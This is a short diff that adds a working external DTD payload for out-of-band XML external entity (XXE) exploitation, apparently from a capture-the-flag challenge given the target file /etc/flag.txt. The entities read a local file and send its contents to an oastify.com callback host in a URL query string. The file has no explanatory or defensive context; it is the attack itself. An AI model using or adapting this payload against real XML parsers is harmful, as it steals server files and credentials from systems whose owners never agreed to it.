@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nypzuq3npk5coaoqxdlnn4mkpbv2jtlha.oastify.com/?x=%file;'>">
+%eval;
+%exfil
